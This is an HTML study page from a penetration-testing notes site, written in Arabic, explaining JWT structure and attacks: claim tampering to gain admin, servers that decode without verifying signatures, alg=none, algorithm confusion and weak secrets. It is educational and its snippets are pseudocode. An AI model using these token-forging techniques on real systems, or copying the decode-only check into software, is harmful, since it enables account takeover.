@@ -1,0 +1,3553 @@
+
+<!doctype html>
+<html lang="ar" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../3-Enumeration%20%26%20Brute%20force/">
+      
+      
+        <link rel="next" href="../5-Oauth%20portswigger/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>ليه JWT vulnerabilities خطيرة جداً ؟ - eWAPTX Zero-Day Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/hacker_style.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="rtl" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#jwt-vulnerabilities" class="md-skip">
+          انتقل إلى المحتوى
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="عنوان العارضة">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-header__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            eWAPTX Zero-Day Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              ليه JWT vulnerabilities خطيرة جداً ؟
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="بحث" placeholder="بحث" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="إبحث">
+        
+        <button type="reset" class="md-search__icon md-icon" title="مسح كلي" aria-label="مسح كلي" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            بدء البحث
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="تصفح" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-nav__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    eWAPTX Zero-Day Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Welcome to MkDocs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-EWAPTX/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1 EWAPTX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-EWAPTX%20%28part%202%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2 EWAPTX (part 2)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-Enumeration%20%26%20Brute%20force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication Enumeration — الفكرة ببساطة
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ليه JWT vulnerabilities خطيرة جداً ؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-Oauth%20portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5 Oauth portswigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-SQL%20INJECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6 SQL INJECTION
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7-Blind%20Sql%20Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    أولاً: ما هو Blind SQL Injection؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-NOSQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📁 الدليل الشامل لأساسيات MongoDB واختبار اختراق NoSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../9-NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9 NoSQL injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="jwt-vulnerabilities">ليه JWT vulnerabilities خطيرة جداً ؟</h1>
+<p>JWT غالباً يُستخدم في:</p>
+<ul>
+<li>Authentication</li>
+<li>Session Management</li>
+<li>Access Control</li>
+</ul>
+<p>يعني لو كسرت JWT 👉 غالباً كسرت الموقع كله.</p>
+<p>بمعنى:</p>
+<blockquote>
+<p>JWT bug = Full Account Takeover غالباً.</p>
+</blockquote>
+<hr />
+<h1 id="jwt">🧠 الفكرة الأساسية للهجمات على JWT</h1>
+<p>فاكر أهم فكرة قلناها قبل كده؟</p>
+<p>JWT = السيرفر لا يخزن session<br />
+السيرفر يثق في التوكن نفسه.</p>
+<p>يعني:<br />
+السيرفر يثق في <strong>البيانات اللي المستخدم نفسه بيبعتها له</strong> 😈</p>
+<p>وده عكس session التقليدي.</p>
+<p>وهنا تبدأ المشاكل.</p>
+<hr />
+<h1 id="jwt_1">🧩 مراجعة سريعة لتركيب JWT (عشان نبني الهجمات عليه)</h1>
+<p>JWT شكله:</p>
+<pre><code>HEADER.PAYLOAD.SIGNATURE
+</code></pre>
+<p>مثال:</p>
+<pre><code>eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIn0.XYZ
+</code></pre>
+<p>كل جزء ليه دور مهم في الهجوم.</p>
+<hr />
+<h1 id="1-header">1️⃣ Header (الميتاداتا)</h1>
+<p>بيحدد حاجتين مهمين جداً:</p>
+<pre><code>{  &quot;alg&quot;: &quot;RS256&quot;,  &quot;kid&quot;: &quot;9136ddb3&quot;}
+</code></pre>
+<h3 id="_1">أهم حقول الهجوم:</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>ليه مهم ؟</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>alg</td>
+<td>نوع التوقيع</td>
+</tr>
+<tr>
+<td>kid</td>
+<td>معرف المفتاح</td>
+</tr>
+</tbody>
+</table>
+<p>هتشوف بعد شوية إن الاتنين دول بوابة هجمات ضخمة 🔥</p>
+<hr />
+<h1 id="2-payload-claims">2️⃣ Payload (الـ Claims)</h1>
+<p>ده يحتوي بيانات المستخدم:</p>
+<pre><code>{  &quot;sub&quot;: &quot;carlos&quot;,  &quot;role&quot;: &quot;blog_author&quot;,  &quot;email&quot;: &quot;carlos@site.com&quot;}
+</code></pre>
+<p>السيرفر يقرأه ويقرر:</p>
+<ul>
+<li>هل Admin؟</li>
+<li>هل User؟</li>
+<li>هل مسموح له يدخل /admin ؟</li>
+</ul>
+<p>🚨 المشكلة:<br />
+أي حد يقدر يقرأه ويعدّله بسهولة.</p>
+<p>ليه؟ لأنه Base64 فقط وليس encryption.</p>
+<p>أي بنتستر أول حاجة يعملها:<br />
+<strong>Decode JWT وشوف فيه إيه.</strong></p>
+<hr />
+<h1 id="_2">⚠️ أهم جملة في الشابتر كله</h1>
+<blockquote>
+<p>JWT is signed, NOT encrypted.</p>
+</blockquote>
+<p>يعني:</p>
+<ul>
+<li>تقدر تقرأه ✔️</li>
+<li>تقدر تعدله ✔️</li>
+<li>لكن المفروض ما تقدرش تغيّر الـ signature ❌</li>
+</ul>
+<p>والهجمات كلها بتحاول تكسر الفكرة دي.</p>
+<hr />
+<h1 id="3-signature">3️⃣ Signature (حارس البوابة)</h1>
+<p>السيرفر يعمل:</p>
+<pre><code>signature = Sign(header + payload, SECRET_KEY)
+</code></pre>
+<p>ثم لما الطلب يرجع:</p>
+<p>السيرفر يعمل Verify:</p>
+<ul>
+<li>يعيد حساب التوقيع</li>
+<li>يقارن مع الموجود</li>
+</ul>
+<p>لو مطابق → التوكن سليم.</p>
+<hr />
+<h1 id="byte">🧠 ليه تغيير Byte واحد يكسر التوقيع؟</h1>
+<p>لأن التوقيع = Hash للـ Header + Payload.</p>
+<p>لو غيرت:</p>
+<pre><code>&quot;role&quot;: &quot;user&quot;
+</code></pre>
+<p>إلى:</p>
+<pre><code>&quot;role&quot;: &quot;admin&quot;
+</code></pre>
+<p>يبقى الهاش اتغير → signature invalid.</p>
+<p>إلا لو قدرت تولد signature جديد 😈</p>
+<p>وده هدف كل JWT attacks.</p>
+<hr />
+<h1 id="tampering-with-jwt-claims">🎯 فكرة Tampering with JWT Claims</h1>
+<p>أول نوع هجمات في الشابتر.</p>
+<p>اسمها:<br />
+<strong>JWT claim tampering</strong></p>
+<p>الفكرة ببساطة:</p>
+<ol>
+<li>افتح التوكن</li>
+<li>عدل البيانات</li>
+<li>حاول تخلي السيرفر يقبل التوكن رغم التعديل</li>
+</ol>
+<p>لو نجحت → انتهى الموقع.</p>
+<hr />
+<h2 id="_3">🧪 مثال واقعي جداً</h2>
+<p>السيرفر يرسل JWT فيه:</p>
+<pre><code>{  &quot;username&quot;: &quot;wiener&quot;,  &quot;role&quot;: &quot;user&quot;}
+</code></pre>
+<p>الموقع يعتمد على role في تحديد الصلاحيات.</p>
+<p>مثلاً:</p>
+<pre><code>if token.role == &quot;admin&quot;:    allow_admin_panel()
+</code></pre>
+<p>لو قدرت تغيّر:</p>
+<pre><code>&quot;role&quot;: &quot;admin&quot;
+</code></pre>
+<p>يبقى أنت Admin بدون login.</p>
+<p>ده اسمه:<br />
+<strong>Privilege escalation via JWT</strong></p>
+<p>وهو أشهر سيناريو في PortSwigger labs.</p>
+<hr />
+<h1 id="_4">🧠 ليه التلاعب ممكن ينجح أصلاً؟</h1>
+<p>لسببين رئيسيين:</p>
+<h2 id="1-signature">السبب 1️⃣ السيرفر لا يتحقق من signature أصلاً 😱</h2>
+<p>Bug مشهور جداً.</p>
+<p>السيرفر يعمل:</p>
+<ul>
+<li>decode token</li>
+<li>يقرأ payload</li>
+<li>يستخدم البيانات مباشرة</li>
+</ul>
+<p>بدون verify.</p>
+<p>يعني:<br />
+JWT يتحول إلى مجرد JSON 😅</p>
+<p>وده vulnerability خطير جداً.</p>
+<hr />
+<h2 id="2">السبب 2️⃣ السيرفر يتحقق بطريقة غلط</h2>
+<p>وده اللي هنشوفه في باقي الشابتر:</p>
+<p>أشهر أخطاء التحقق:</p>
+<ul>
+<li>قبول alg = none</li>
+<li>خلط بين RS256 و HS256</li>
+<li>استخدام secret ضعيف</li>
+<li>استخدام kid header بطريقة خطأ</li>
+<li>عدم التحقق من signature بشكل صحيح</li>
+</ul>
+<p>ودي كلها هجمات كبيرة هنتعلمها واحدة واحدة.</p>
+<hr />
+<h1 id="_5">💥 خلاصة الكلام لحد هنا</h1>
+<p>JWT security يعتمد بالكامل على:<br />
+👉 صحة التحقق من الـ signature.</p>
+<p>لو verification فيه bug →<br />
+أي حد يقدر:</p>
+<ul>
+<li>يزوّر التوكن</li>
+<li>يغير الصلاحيات</li>
+<li>ياخد Admin</li>
+<li>يخترق كل الحسابات</li>
+</ul>
+<hr />
+<h1 id="jwt-vs-jws-vs-jwe">JWT vs JWS vs JWE (أهم لخبطة بتحصل)</h1>
+<p>ناس كتير فاكرة إنهم نفس الحاجة… لكن الحقيقة 👇</p>
+<h2 id="jwt-format">📌 أولاً: JWT = مجرد <strong>Format</strong></h2>
+<p>JWT في الأساس مش نظام أمان 😅</p>
+<p>هو فقط:</p>
+<blockquote>
+<p>طريقة لتمثيل البيانات كـ JSON وإرسالها بين طرفين.</p>
+</blockquote>
+<p>يعني JWT لوحده:</p>
+<ul>
+<li>لا يحدد التوقيع</li>
+<li>لا يحدد التشفير</li>
+<li>لا يحدد الأمان</li>
+</ul>
+<p>هو مجرد <strong>container للبيانات</strong>.</p>
+<p>زي ظرف بريد 📩<br />
+لكن لسه مش عارفين هل:</p>
+<ul>
+<li>مختوم؟ (signed)</li>
+<li>ولا متشفر؟ (encrypted)</li>
+</ul>
+<p>وهنا ييجي دور JWS و JWE.</p>
+<hr />
+<h1 id="jws-json-web-signature">✍️ JWS = JSON Web Signature</h1>
+<p>ده النوع اللي احنا بنسميه غالباً "JWT" في الواقع.</p>
+<h2 id="_6">🎯 ماذا يفعل؟</h2>
+<p>يضيف <strong>توقيع رقمي</strong> للـ JWT.</p>
+<p>يعني:</p>
+<ul>
+<li>البيانات يمكن قراءتها ✔️</li>
+<li>لا يمكن تعديلها بدون كسر التوقيع ❌</li>
+</ul>
+<p>ده بالضبط التوكن اللي شفناه قبل كده:</p>
+<pre><code>HEADER.PAYLOAD.SIGNATURE
+</code></pre>
+<h3 id="_7">⚠️ مهم جداً</h3>
+<p>المحتوى <strong>غير مشفر</strong><br />
+أي حد يقدر يقرأ payload بسهولة.</p>
+<p>لكن لا يقدر يغيّره بدون signature.</p>
+<hr />
+<h1 id="jwe-json-web-encryption">🔐 JWE = JSON Web Encryption</h1>
+<p>ده النسخة المشفرة.</p>
+<h2 id="_8">🎯 ماذا يفعل؟</h2>
+<ul>
+<li>يشفر الـ payload بالكامل.</li>
+<li>لا يمكن قراءته بدون المفتاح.</li>
+</ul>
+<p>يعني:</p>
+<ul>
+<li>لا يمكن قراءة البيانات ❌</li>
+<li>لا يمكن تعديلها ❌</li>
+</ul>
+<p>ده أقوى أماناً لكنه أقل انتشاراً.</p>
+<hr />
+<h2 id="_9">⚖️ مقارنة سريعة</h2>
+<table>
+<thead>
+<tr>
+<th>النوع</th>
+<th>قراءة البيانات</th>
+<th>تعديل البيانات</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JWT فقط</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>JWS</td>
+<td>✔️</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>JWE</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_10">🤯 أهم جملة في الكورس</h2>
+<p>لما تسمع كلمة <strong>JWT</strong> في الواقع:</p>
+<blockquote>
+<p>99% يقصدوا JWS</p>
+</blockquote>
+<p>مش JWE.</p>
+<p>وده مهم جداً لأن معظم الهجمات تستهدف JWS.</p>
+<hr />
+<h1 id="jwt-attacks">💣 ما هي JWT attacks ؟</h1>
+<p>التعريف الرسمي:</p>
+<blockquote>
+<p>إرسال JWT معدل للسيرفر بهدف تحقيق هدف خبيث.</p>
+</blockquote>
+<p>والهدف غالباً:</p>
+<ul>
+<li>تجاوز Authentication</li>
+<li>تجاوز Authorization</li>
+<li>انتحال مستخدم آخر</li>
+<li>الحصول على Admin</li>
+</ul>
+<hr />
+<h1 id="jwt-attacks_1">💥 تأثير JWT attacks</h1>
+<p>لو قدرت تصنع JWT صحيح:<br />
+= أنت تتحكم في الموقع بالكامل.</p>
+<p>تقدر:</p>
+<ul>
+<li>تدخل أي حساب</li>
+<li>تصبح Admin</li>
+<li>تصل لكل بيانات المستخدمين</li>
+</ul>
+<p>ليه التأثير كبير؟</p>
+<p>لأن JWT غالباً هو:<br />
+👉 نظام تسجيل الدخول نفسه.</p>
+<hr />
+<h1 id="jwt-vulnerabilities_1">🤔 لماذا تظهر JWT vulnerabilities ؟</h1>
+<p>سؤال مهم جداً.</p>
+<p>المشكلة ليست في JWT نفسه.<br />
+المشكلة في <strong>طريقة استخدام المطورين له</strong>.</p>
+<p>السبب الرئيسي:<br />
+JWT standard مرن جداً.</p>
+<p>المطور يقرر بنفسه:</p>
+<ul>
+<li>كيف يتحقق من التوقيع</li>
+<li>أي Algorithm يستخدم</li>
+<li>أين يخزن المفتاح</li>
+<li>كيف يتحقق من claims</li>
+</ul>
+<p>المرونة = أخطاء بشرية 😈</p>
+<hr />
+<h1 id="jwt_2">🎯 أصل كل هجمات JWT</h1>
+<p>كل الهجمات ترجع لسببين:</p>
+<h2 id="1">السبب 1️⃣ التحقق من التوقيع ضعيف</h2>
+<p>Signature verification flawed.</p>
+<p>وده أخطر سبب.</p>
+<hr />
+<h2 id="2_1">السبب 2️⃣ المفتاح السري ضعيف أو مكشوف</h2>
+<p>لو المهاجم عرف secret key:<br />
+يستطيع إنشاء أي JWT يريد.</p>
+<p>Game Over.</p>
+<hr />
+<h1 id="jwt-design">🧠 مشكلة أساسية في JWT Design</h1>
+<p>السيرفر لا يخزن التوكن.</p>
+<p>يعني السيرفر لا يعرف:</p>
+<ul>
+<li>التوكن الأصلي</li>
+<li>التوقيع الأصلي</li>
+<li>البيانات الأصلية</li>
+</ul>
+<p>السيرفر يعتمد فقط على:<br />
+👉 التحقق من التوقيع.</p>
+<p>لو التحقق فيه bug → انتهى.</p>
+<hr />
+<h1 id="_11">🎭 مثال عملي على الخطر</h1>
+<p>JWT يحتوي:</p>
+<pre><code>{  &quot;username&quot;: &quot;carlos&quot;,  &quot;isAdmin&quot;: false}
+</code></pre>
+<p>السيرفر يعتمد على:</p>
+<pre><code>if token.isAdmin:    allow_admin_panel()
+</code></pre>
+<p>لو عدلت التوكن إلى:</p>
+<pre><code>&quot;isAdmin&quot;: true
+</code></pre>
+<p>والسيرفر لم يتحقق من التوقيع بشكل صحيح →<br />
+أصبحت Admin بدون اختراق حقيقي 😅</p>
+<p>ده يسمى:<br />
+<strong>Privilege escalation via JWT</strong></p>
+<hr />
+<h1 id="accepting-arbitrary-signatures">⚠️ Accepting Arbitrary Signatures (كارثة شائعة جداً)</h1>
+<p>دي أول vulnerability في اللابات غالباً.</p>
+<h2 id="_12">📚 المشكلة</h2>
+<p>مكتبات JWT توفر دالتين:</p>
+<table>
+<thead>
+<tr>
+<th>الدالة</th>
+<th>وظيفتها</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>decode()</td>
+<td>يفك التوكن فقط</td>
+</tr>
+<tr>
+<td>verify()</td>
+<td>يفك + يتحقق من التوقيع</td>
+</tr>
+</tbody>
+</table>
+<p>بعض المطورين يستخدمون:</p>
+<pre><code>jwt.decode(token)
+</code></pre>
+<p>بدلاً من:</p>
+<pre><code>jwt.verify(token, secret)
+</code></pre>
+<p>وده معناه:</p>
+<blockquote>
+<p>السيرفر لا يتحقق من التوقيع إطلاقاً 😱</p>
+</blockquote>
+<hr />
+<h2 id="_13">😈 ماذا يعني هذا كمهاجم؟</h2>
+<p>أي JWT يصبح صالح.</p>
+<p>يمكنك إنشاء JWT بنفسك:</p>
+<pre><code>{  &quot;username&quot;: &quot;admin&quot;,  &quot;isAdmin&quot;: true}
+</code></pre>
+<p>وإرساله للسيرفر مباشرة.</p>
+<p>وسيقبله!</p>
+<p>لأنه يقرأ البيانات فقط بدون تحقق.</p>
+<hr />
+<h1 id="_14">🔥 خلاصة الدرس كله</h1>
+<h2 id="_15">الفرق الأساسي</h2>
+<ul>
+<li>JWT = Format</li>
+<li>JWS = Signed JWT (الأكثر استخداماً)</li>
+<li>JWE = Encrypted JWT</li>
+</ul>
+<hr />
+<h2 id="_16">أصل كل الهجمات</h2>
+<ol>
+<li>السيرفر يثق في بيانات من المستخدم</li>
+<li>التحقق من التوقيع فيه خطأ</li>
+</ol>
+<p>لو حصل واحد منهم → الموقع قابل للاختراق.</p>
+<hr />
+<p>[^1]</p>
+<p>[^1]: # أولاً: يعني إيه JWT أصلاً؟</p>
+<pre><code>**JWT = JSON Web Token**
+
+هو عبارة عن طريقة تبعت بيها بيانات بين:
+
+- Client (المستخدم / المتصفح)
+- Server (السيرفر)
+
+لكن أهم نقطة:
+
+&gt; البيانات بتكون **self-contained** يعني السيرفر مش محتاج يخزن session في الداتابيز.
+
+بدل ما السيرفر يخزن session زي:
+
+```
+SessionID -&gt; user data
+```
+
+هو بيدي للمستخدم **توكن فيه كل البيانات**  
+والمستخدم يرجعه كل request.
+
+وده سبب إن JWT مشهور جداً في:
+
+- Authentication
+- Session Management
+- Access Control
+- Microservices
+
+---
+
+# شكل الـ JWT
+
+التوكن بيتكوّن من 3 أجزاء مفصولين بنقطة:
+
+```
+HEADER.PAYLOAD.SIGNATURE
+```
+
+زي كده:
+
+```
+xxxxx.yyyyy.zzzzz
+```
+
+## الجزء 1️⃣: Header
+
+ده metadata عن التوكن.
+
+مثال:
+
+```
+{  "alg": "RS256",  "typ": "JWT"}
+```
+
+معنى الكلام ده:
+
+|Field|معناه|
+|---|---|
+|alg|نوع خوارزمية التوقيع|
+|typ|نوع التوكن|
+
+الخوارزميات المشهورة:
+
+- HS256 → HMAC (secret key)
+- RS256 → RSA (public/private key)
+- none → بدون توقيع 😈 (خطير جداً)
+
+---
+
+## الجزء 2️⃣: Payload (الـ Claims)
+
+ده أهم جزء… فيه بيانات المستخدم.
+
+مثال:
+
+```
+{  "iss": "portswigger",  "exp": 1648037164,  "name": "Carlos Montoya",  "sub": "carlos",  "role": "blog_author",  "email": "carlos@site.com",  "iat": 1516239022}
+```
+
+### يعني إيه Claims؟
+
+Claims = معلومات عن المستخدم أو الجلسة.
+
+أنواع الـ claims:
+
+### 1️⃣ Registered Claims (قياسية)
+
+|claim|معناها|
+|---|---|
+|iss|مين أصدر التوكن|
+|sub|المستخدم|
+|exp|وقت انتهاء التوكن|
+|iat|وقت إصدار التوكن|
+
+### 2️⃣ Public claims
+
+زي:
+
+```
+roleemailusername
+```
+
+### 3️⃣ Private claims
+
+أي حاجة الأبلكيشن محتاجها.
+
+---
+
+⚠️ أهم نقطة:
+
+&gt; الـ Header و Payload مش encrypted ❗  
+&gt; هم بس **Base64URL encoded**
+
+يعني أي حد معاه التوكن يقدر يفكّه ويقرأه.
+
+بس مش يقدر يعدّل عليه… ليه؟  
+علشان الجزء التالت 👇
+
+---
+
+## الجزء 3️⃣: Signature (التوقيع)
+
+ده أهم جزء في الأمن كله.
+
+السيرفر بيعمل:
+
+```
+Signature = Sign(   base64Url(header) + "." + base64Url(payload),   secret_key)
+```
+
+يعني:
+
+- السيرفر عنده secret key
+- بيستخدمه لتوقيع التوكن
+
+لما المستخدم يبعت التوكن:  
+السيرفر يعيد حساب التوقيع ويقارنه.
+
+لو اتغير **حرف واحد** في payload → التوقيع يبوظ.
+
+---
+
+# ليه JWT خطر لو اتنفذ غلط؟
+
+لأن السيرفر **مش بيخزن التوكن**.
+
+يعني:  
+السيرفر مش فاكر:
+
+- التوكن الأصلي
+- التوقيع الأصلي
+
+هو بس:
+
+- يستقبل التوكن
+- يشيّك التوقيع
+- يثق في البيانات جوه التوكن.
+
+لو التوقيع اتفحص غلط → انتهى الموقع 😈
+
+---
+
+# ثانياً: JWT vs JWS vs JWE
+
+دي نقطة ناس كتير بتتلخبط فيها.
+
+## JWT = Format فقط
+
+JWT مجرد **شكل للبيانات**.
+
+لكن لازم يتحقق بإحدى طريقتين:
+
+### JWS → Signed JWT (الأشهر)
+
+التوكن:
+
+- readable
+- signed فقط
+
+يعني:  
+أي حد يقدر يقرأ البيانات  
+بس مش يقدر يغيرها.
+
+وده اللي الناس بتقصده لما تقول JWT.
+
+---
+
+### JWE → Encrypted JWT
+
+التوكن:
+
+- encrypted بالكامل 🔒
+- محدش يقدر يقراه غير السيرفر
+
+يعني:
+
+```
+JWT = JWS أو JWE
+```
+
+وفي الكورس هنا لما يقول JWT → يقصد JWS غالباً.
